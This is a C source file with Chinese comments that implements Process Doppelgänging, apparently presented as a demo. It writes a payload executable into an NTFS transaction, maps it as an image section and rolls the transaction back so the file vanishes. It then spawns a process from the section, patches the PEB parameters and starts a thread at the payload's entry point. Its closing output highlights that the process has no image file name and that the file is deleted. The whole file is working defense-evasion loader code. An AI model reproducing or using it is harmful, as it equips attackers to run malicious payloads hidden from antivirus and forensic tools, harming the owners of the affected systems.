#include <windows.h>
#include <stdio.h>
#include <ktmw32.h>
#include <userenv.h>
#include "internals.h"
#include "pe_utils.h"

#pragma comment(lib, "ktmw32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "userenv.lib")

// ===== 全局函数指针定义 =====
_NtCreateSection NtCreateSection = NULL;
_NtCreateProcessEx NtCreateProcessEx = NULL;
_NtCreateThreadEx NtCreateThreadEx = NULL;
_NtReadVirtualMemory NtReadVirtualMemory = NULL;
_RtlCreateProcessParametersEx RtlCreateProcessParametersEx = NULL;

/**
 * 初始化 NT API 函数指针
 */
BOOL InitializeNtFunctions() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("错误：无法获取 ntdll.dll 句柄\n");
        return FALSE;
    }

    NtCreateSection = (_NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    NtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    RtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");

    if (!NtCreateSection || !NtCreateProcessEx || !NtCreateThreadEx ||
        !NtReadVirtualMemory || !RtlCreateProcessParametersEx) {
        printf("错误：无法获取 NT API 函数地址\n");
        return FALSE;
    }

    return TRUE;
}

/**
 * 创建事务性内存节
 */
HANDLE CreateTransactedSection(BYTE* payloadBuf, DWORD payloadSize) {
    printf("\n[1] 创建 NTFS 事务\n");

    // 1. 创建事务
    HANDLE hTransaction = CreateTransaction(
        NULL, NULL, 0, 0, 0, 0, NULL
    );

    if (hTransaction == INVALID_HANDLE_VALUE) {
        printf("错误：创建事务失败，错误码：%d\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }
    printf("    事务句柄：0x%p\n", hTransaction);

    // 2. 创建临时文件名
    WCHAR tempPath[MAX_PATH];
    WCHAR dummyName[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    GetTempFileNameW(tempPath, L"PD", 0, dummyName);

    // 3. 创建事务性文件（写入）
    printf("\n[2] 创建事务性文件（写入）\n");
    printf("    文件路径：%ls\n", dummyName);

    HANDLE hTransactedWriter = CreateFileTransactedW(
        dummyName,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );

    if (hTransactedWriter == INVALID_HANDLE_VALUE) {
        printf("错误：创建事务性文件失败，错误码：%d\n", GetLastError());
        CloseHandle(hTransaction);
        return INVALID_HANDLE_VALUE;
    }

    // 4. 写入载荷
    printf("\n[3] 写入载荷到事务性文件\n");
    printf("    载荷大小：%d 字节\n", payloadSize);

    DWORD bytesWritten = 0;
    if (!WriteFile(hTransactedWriter, payloadBuf, payloadSize, &bytesWritten, NULL)) {
        printf("错误：写入文件失败，错误码：%d\n", GetLastError());
        CloseHandle(hTransactedWriter);
        CloseHandle(hTransaction);
        return INVALID_HANDLE_VALUE;
    }
    printf("    已写入：%d 字节\n", bytesWritten);

    CloseHandle(hTransactedWriter);

    // 5. 重新打开事务性文件（读取）
    printf("\n[4] 重新打开事务性文件（读取）\n");

    HANDLE hTransactedReader = CreateFileTransactedW(
        dummyName,
        GENERIC_READ,
        FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );

    if (hTransactedReader == INVALID_HANDLE_VALUE) {
        printf("错误：打开事务性文件失败，错误码：%d\n", GetLastError());
        CloseHandle(hTransaction);
        return INVALID_HANDLE_VALUE;
    }

    // 6. 从文件创建内存节
    printf("\n[5] 创建内存节对象（SEC_IMAGE）\n");

    HANDLE hSection = NULL;
    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_MAP_EXECUTE,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedReader
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：NtCreateSection 失败，状态码：0x%lX\n", status);
        CloseHandle(hTransactedReader);
        CloseHandle(hTransaction);
        return INVALID_HANDLE_VALUE;
    }
    printf("    节句柄：0x%p\n", hSection);

    CloseHandle(hTransactedReader);

    // 7. 回滚事务
    printf("\n[6] 回滚事务（删除文件）\n");

    if (!RollbackTransaction(hTransaction)) {
        printf("警告：回滚事务失败，错误码：%d\n", GetLastError());
    } else {
        printf("    事务已回滚，文件已删除\n");
    }

    CloseHandle(hTransaction);

    printf("    内存节创建成功！\n");
    return hSection;
}

/**
 * 设置进程参数（简化版）
 */
BOOL SetupProcessParameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION* pbi, const WCHAR* targetPath) {
    printf("\n[9] 设置进程参数\n");

    // 1. 初始化 UNICODE_STRING
    UNICODE_STRING uImagePath;
    RtlInitUnicodeString(&uImagePath, targetPath);

    WCHAR dllDir[] = L"C:\\Windows\\System32";
    UNICODE_STRING uDllPath;
    RtlInitUnicodeString(&uDllPath, dllDir);

    WCHAR currentDir[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, currentDir);
    UNICODE_STRING uCurrentDir;
    RtlInitUnicodeString(&uCurrentDir, currentDir);

    WCHAR windowName[] = L"Process Doppelgänging Demo";
    UNICODE_STRING uWindowName;
    RtlInitUnicodeString(&uWindowName, windowName);

    // 2. 创建环境块
    PVOID environment = NULL;
    CreateEnvironmentBlock(&environment, NULL, TRUE);

    // 3. 创建进程参数
    PMY_RTL_USER_PROCESS_PARAMETERS params = NULL;
    NTSTATUS status = RtlCreateProcessParametersEx(
        &params,
        &uImagePath,
        &uDllPath,
        &uCurrentDir,
        &uImagePath,
        environment,
        &uWindowName,
        NULL,
        NULL,
        NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：RtlCreateProcessParametersEx 失败，状态码：0x%lX\n", status);
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    // 4. 在远程进程中分配内存并写入参数
    PVOID remoteParams = NULL;
    SIZE_T paramsSize = params->Length;

    if (!VirtualAllocEx(hProcess, params, paramsSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
        printf("错误：在远程进程分配参数内存失败\n");
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, params, params, paramsSize, NULL)) {
        printf("错误：写入进程参数失败\n");
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    // 5. 写入环境变量
    if (params->Environment) {
        if (!VirtualAllocEx(hProcess, params->Environment, params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
            printf("警告：分配环境变量内存失败\n");
        } else {
            WriteProcessMemory(hProcess, params->Environment, params->Environment, params->EnvironmentSize, NULL);
        }
    }

    // 6. 更新 PEB 中的 ProcessParameters 指针
    MY_PEB peb = {0};
    SIZE_T bytesRead = 0;

    status = NtReadVirtualMemory(hProcess, pbi->PebBaseAddress, &peb, sizeof(MY_PEB), &bytesRead);
    if (status != STATUS_SUCCESS) {
        printf("错误：读取远程 PEB 失败\n");
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    // 计算 ProcessParameters 字段的偏移
    ULONG_PTR offset = (ULONG_PTR)&peb.ProcessParameters - (ULONG_PTR)&peb;
    PVOID remoteParamsAddr = (PVOID)((ULONG_PTR)pbi->PebBaseAddress + offset);

    if (!WriteProcessMemory(hProcess, remoteParamsAddr, &params, sizeof(PVOID), NULL)) {
        printf("错误：更新 PEB ProcessParameters 失败\n");
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    if (environment) DestroyEnvironmentBlock(environment);

    printf("    进程参数已设置\n");
    return TRUE;
}

/**
 * 主函数：进程变脸（Process Doppelgänging）
 */
int wmain(int argc, WCHAR* argv[]) {
    printf("======================================\n");
    printf("      进程变脸技术演示程序\n");
    printf("   Process Doppelgänging Demo\n");
    printf("======================================\n");

    if (argc < 2) {
        printf("\n用法：%ls <载荷路径> [目标路径]\n", argv[0]);
        printf("\n示例：\n");
        printf("  %ls payload.exe\n", argv[0]);
        printf("  %ls payload.exe C:\\\\Windows\\\\System32\\\\calc.exe\n", argv[0]);
        printf("\n说明：\n");
        printf("  载荷路径：要执行的 PE 文件\n");
        printf("  目标路径：可选，用于进程参数\n");
        return 1;
    }

    // 初始化函数指针
    if (!InitializeNtFunctions()) {
        return 1;
    }

    const WCHAR* payloadPath = argv[1];
    WCHAR targetPath[MAX_PATH] = {0};

    if (argc >= 3) {
        wcscpy_s(targetPath, MAX_PATH, argv[2]);
    } else {
        #ifdef _WIN64
            wcscpy_s(targetPath, MAX_PATH, L"C:\\Windows\\System32\\calc.exe");
        #else
            wcscpy_s(targetPath, MAX_PATH, L"C:\\Windows\\SysWOW64\\calc.exe");
        #endif
    }

    printf("\n========== 开始进程变脸 ==========\n");
    printf("载荷文件：%ls\n", payloadPath);
    printf("目标路径：%ls\n", targetPath);

    // 读取载荷
    printf("\n[0] 读取载荷文件\n");
    DWORD payloadSize = 0;
    BYTE* payloadBuf = ReadFileToBuffer(payloadPath, &payloadSize);
    if (!payloadBuf) {
        return 1;
    }

    BOOL isPayload64 = IsPE64Bit(payloadBuf);
    printf("    载荷架构：%s\n", isPayload64 ? "64 位" : "32 位");

    // 创建事务性内存节
    HANDLE hSection = CreateTransactedSection(payloadBuf, payloadSize);
    if (hSection == INVALID_HANDLE_VALUE) {
        free(payloadBuf);
        return 1;
    }

    // 从内存节创建进程（关键步骤！）
    printf("\n[7] 从内存节创建进程（NtCreateProcessEx）\n");

    HANDLE hProcess = NULL;
    NTSTATUS status = NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),  // 父进程
        PS_INHERIT_HANDLES,   // 继承句柄
        hSection,             // 从节创建！
        NULL,                 // DebugPort
        NULL,                 // ExceptionPort
        FALSE                 // InJob
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：NtCreateProcessEx 失败，状态码：0x%lX\n", status);
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            printf("提示：载荷架构不匹配（32/64 位）\n");
        }
        CloseHandle(hSection);
        free(payloadBuf);
        return 1;
    }

    DWORD processId = GetProcessId(hProcess);
    printf("    进程已创建！\n");
    printf("    进程 ID：%d\n", processId);
    printf("    进程句柄：0x%p\n", hProcess);

    // 查询进程信息
    printf("\n[8] 查询进程基本信息\n");

    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG returnLength = 0;

    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：NtQueryInformationProcess 失败，状态码：0x%lX\n", status);
        TerminateProcess(hProcess, 1);
        CloseHandle(hSection);
        free(payloadBuf);
        return 1;
    }

    printf("    PEB 地址：0x%p\n", pbi.PebBaseAddress);

    // 读取 PEB 获取 ImageBase
    MY_PEB peb = {0};
    SIZE_T bytesRead = 0;
    status = NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(MY_PEB), &bytesRead);
    if (status != STATUS_SUCCESS) {
        printf("错误：读取 PEB 失败\n");
        TerminateProcess(hProcess, 1);
        CloseHandle(hSection);
        free(payloadBuf);
        return 1;
    }

    printf("    镜像基址：0x%p\n", peb.ImageBaseAddress);

    // 设置进程参数
    if (!SetupProcessParameters(hProcess, &pbi, targetPath)) {
        printf("警告：设置进程参数失败，继续执行\n");
    }

    // 计算入口点
    printf("\n[10] 创建线程执行入口点\n");

    DWORD entryRVA = GetEntryPointRVA(payloadBuf);
    ULONG_PTR entryPoint = (ULONG_PTR)peb.ImageBaseAddress + entryRVA;

    printf("    入口点 RVA：0x%X\n", entryRVA);
    printf("    入口点 VA：0x%p\n", (PVOID)entryPoint);

    // 创建线程
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE)entryPoint,
        NULL,
        FALSE,  // 不挂起
        0,
        0,
        0,
        NULL
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：NtCreateThreadEx 失败，状态码：0x%lX\n", status);
        TerminateProcess(hProcess, 1);
        CloseHandle(hSection);
        free(payloadBuf);
        return 1;
    }

    printf("    线程已创建！\n");
    printf("    线程 ID：%d\n", GetThreadId(hThread));

    printf("\n========== 进程变脸完成 ==========\n");
    printf("进程 %d 正在运行载荷代码\n", processId);
    printf("\n特点：\n");
    printf("  • GetProcessImageFileName 返回空字符串\n");
    printf("  • 进程从未关联的内存节创建\n");
    printf("  • 文件已被事务回滚删除\n");

    // 清理
    CloseHandle(hThread);
    CloseHandle(hSection);
    free(payloadBuf);
    CloseHandle(hProcess);

    return 0;
}
